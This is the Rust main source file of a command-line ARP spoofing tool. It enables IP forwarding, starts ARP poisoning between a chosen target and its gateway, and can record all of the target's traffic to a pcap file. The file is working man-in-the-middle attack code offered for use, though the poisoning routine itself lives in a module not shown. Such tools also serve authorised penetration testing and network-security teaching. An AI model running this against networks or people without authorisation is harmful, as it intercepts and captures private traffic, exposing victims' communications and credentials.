extern crate pcap;
extern crate argparse;
extern crate nix;
extern crate time;

use std::process;
use std::thread;
use std::str::FromStr;
use std::io::stdout;
use std::io::{Read, Write};
use std::io::Error;
use std::fs::{File,OpenOptions};
use std::sync::{Arc, Mutex};
use std::net::Ipv4Addr;

use argparse::{ArgumentParser, StoreTrue, StoreFalse, Store, Print};
use nix::sys::signal;

pub mod arp;

/// Struct which holds all possible arguments
struct ArgOptions {
    interface: String,
    own_ip: Ipv4Addr,
    target_ip: Ipv4Addr,
    gateway_ip: Ipv4Addr,
    ip_forward: bool,
    verbose: bool,
    log_traffic: bool,
}

fn main() {

    // Define SIGINT handler
    let sig_action = signal::SigAction::new(handle_sigint, signal::SockFlag::empty(), signal::SigSet::empty());
    unsafe {
        match signal::sigaction(signal::SIGINT, &sig_action) {
            Ok(_) => (),
            Err(e) => panic!("Unable to register SIGINT handler: {}", e),
        }
    }

    let arg_options = parse_args();

    let own_mac_addr = get_interface_mac_addr(arg_options.interface.as_ref());
    println!("Own mac address for {} is: {}", arg_options.interface, arp::mac_to_string(&own_mac_addr));

    // Enable kernel ip forwarding
    if arg_options.ip_forward == true {
        match ip_forward(arg_options.ip_forward) {
            Ok(_)   => (),
            Err(e)  => panic!("ip_forward() failed! {}", e),
        }
    }

    // Enable traffic logging
    if arg_options.log_traffic == true {
        let log_cap_filter = String::from(format!("host {}", arg_options.target_ip));
        let mut log_cap = pcap_open(arg_options.interface.as_ref(), log_cap_filter.as_ref(), 0);
        thread::spawn(move || {
            log_traffic_pcap(&mut log_cap, "save.pcap");
        });
    }

    // Start arp spoofing
    let cap_ptr = Arc::new(Mutex::new(pcap_open(arg_options.interface.as_ref(), "arp", 5000)));
    arp::arp_poisoning(cap_ptr, own_mac_addr, arg_options.own_ip, arg_options.target_ip, arg_options.gateway_ip);

}

/// Opens a pcap capture device
fn pcap_open(interface_name: &str, pcap_filter: &str, pcap_timeout: i32) -> pcap::Capture<pcap::Active> {
    let mut cap = pcap::Capture::from_device(interface_name).unwrap().timeout(pcap_timeout).open().unwrap();
    cap.filter(pcap_filter).unwrap();
    cap
}

/// extern "C" sigint handler
extern fn handle_sigint(_:i32) {
    println!("\nInterrupted!");
    match ip_forward(false) {
        Ok(_)   => (),
        Err(e)  => println!("{}", e),
    }
    process::exit(1);
}

/// Parses args or panics if something is missing.
fn parse_args() -> ArgOptions {

    let mut options = ArgOptions {
        interface: String::from(""),
        own_ip: Ipv4Addr::new(0, 0, 0, 0),
        target_ip: Ipv4Addr::new(0, 0, 0, 0),
        gateway_ip: Ipv4Addr::new(0, 0, 0, 0),
        ip_forward: true,
        verbose: false,
        log_traffic: false,
    };
    {   // This block limits scope of borrows by ap.refer() method
        let mut ap = ArgumentParser::new();
        ap.set_description("Minimal ARP spoofing tool written in rust.");
        ap.refer(&mut options.interface).add_option(&["-i","--interface"], Store, "interface name").required();
        ap.refer(&mut options.own_ip).add_option(&["--own"], Store, "own ipv4 address (required until pcap allows ip enumeration)").required();
        ap.refer(&mut options.target_ip).add_option(&["--target"], Store, "target ipv4 address").required();
        ap.refer(&mut options.gateway_ip).add_option(&["--gateway"], Store, "gateway ipv4 address").required();
        ap.refer(&mut options.log_traffic).add_option(&["--log-traffic"], StoreTrue, "logs all target traffic to `save.pcap`");
        ap.refer(&mut options.ip_forward).add_option(&["-n", "--no-forward"], StoreFalse, "leave `/proc/sys/net/ipv4/ip_forward` untouched");
        ap.refer(&mut options.verbose).add_option(&["-v", "--verbose"], StoreTrue, "be verbose");
        ap.add_option(&["-V", "--version"], Print(env!("CARGO_PKG_VERSION").to_string()), "show version");
        ap.parse_args_or_exit();
    }
    // FIXME: use of unstable library feature 'ip': extra functionality has not been scrutinized to the level that it should be stable (see issue #27709)
    //assert_eq!(true, options.target_ip.is_private());
    //assert_eq!(true, options.gateway_ip.is_private());
    options
}

/// Logs traffic to pcap file and prints network statistic
pub fn log_traffic_pcap(cap: &mut pcap::Capture<pcap::Active>, log_file: &str) {

    let mut savefile = cap.savefile(log_file).unwrap();

    let mut last_stats = time::precise_time_s();
    let stats_threshold = 15.0;
    loop {
        {
            let packet = cap.next().unwrap();
            savefile.write(&packet);
        }
        if (time::precise_time_s() - last_stats) > stats_threshold {
            let stats = cap.stats().unwrap();
            print!("\r[*] Received: {}, dropped: {}, if_dropped: {}", stats.received, stats.dropped, stats.if_dropped);
            match stdout().flush() {
                Ok(_)   => (),
                Err(e)  => println!("{}", e),
            }
            last_stats = time::precise_time_s();
        }
    }
}

/// Modifies `/proc/sys/net/ipv4/ip_forward` to enable/disable ip forwarding
fn ip_forward(enable: bool) -> Result<(), Error> {
    let ipv4_fw_path = "/proc/sys/net/ipv4/ip_forward";
    let ipv4_fw_value = match enable {
        true    => "1\n",
        false   => "0\n",
    };

    let result = match OpenOptions::new().write(true).open(ipv4_fw_path) {
        Ok(mut f) => f.write_all(String::from(ipv4_fw_value).as_bytes()),
        Err(e) => panic!("Unable to open {}: {}", ipv4_fw_path, e),
    };
    println!("[+] forwarding ipv4 traffic: {}", enable);
    result
}

/// This function is obsolete as soon as device info enumeration is implemented
/// See: https://github.com/ebfull/pcap/issues/13
fn get_interface_mac_addr(interface_name: &str) -> [u8; 6] {
    let path = format!("/sys/class/net/{}/address", interface_name);
    let mut mac_addr_buf = String::new();
    let f = match File::open(&path) {
        Ok(mut f) => f.read_to_string(&mut mac_addr_buf),
        Err(e) => panic!("Unable to read mac address from {} (Network interface down?): {}", path, e),
    };
    arp::string_to_mac(String::from_str(mac_addr_buf.trim()).unwrap())
}
